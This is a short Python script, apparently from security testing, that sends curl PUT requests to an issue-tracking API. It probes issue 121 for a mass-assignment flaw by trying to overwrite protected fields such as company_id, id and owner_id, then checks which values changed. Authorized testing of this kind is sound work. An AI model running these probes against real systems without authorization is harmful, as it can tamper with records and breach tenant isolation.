import json,subprocess,os
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
def req(method,path,body=None):
    cmd=['curl','-s','-m','60','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
print("=== issue 121 baseline ===")
c,b=req('GET','/api/v1/issues/121')
try:
    i=json.loads(b)['issues'][0]
    print(f"  title={i.get('title')!r} status={i.get('status')!r} owner={i.get('owner_id')} created={i.get('created_at')}")
    open('/tmp/issue121.json','w').write(json.dumps(i))
except Exception as e: print("  ",b[:200])
print("\n=== mass-assign probes on issue 121 (read-only fields + tenant fields) ===")
probes=[
 ("company_id",{"issue":{"company_id":999}}),
 ("created_at",{"issue":{"created_at":"2020-01-01T00:00:00Z"}}),
 ("id",{"issue":{"id":999}}),
 ("owner_id",{"issue":{"owner_id":1}}),
 ("status",{"issue":{"status":"Closed"}}),
 ("custom_text1",{"issue":{"custom_text1":"ZXPROBE"}}),
]
for label,body in probes:
    c,b=req('PUT','/api/v1/issues/121',body)
    print(f"  {label:14} -> {c} {b[:110].replace(chr(10),' ')}")
print("\n=== verify what actually changed ===")
c,b=req('GET','/api/v1/issues/121')
i2=json.loads(b)['issues'][0]
print(f"  title={i2.get('title')!r} status={i2.get('status')!r} owner={i2.get('owner_id')} created={i2.get('created_at')} custom_text1={i2.get('custom_text1')!r}")
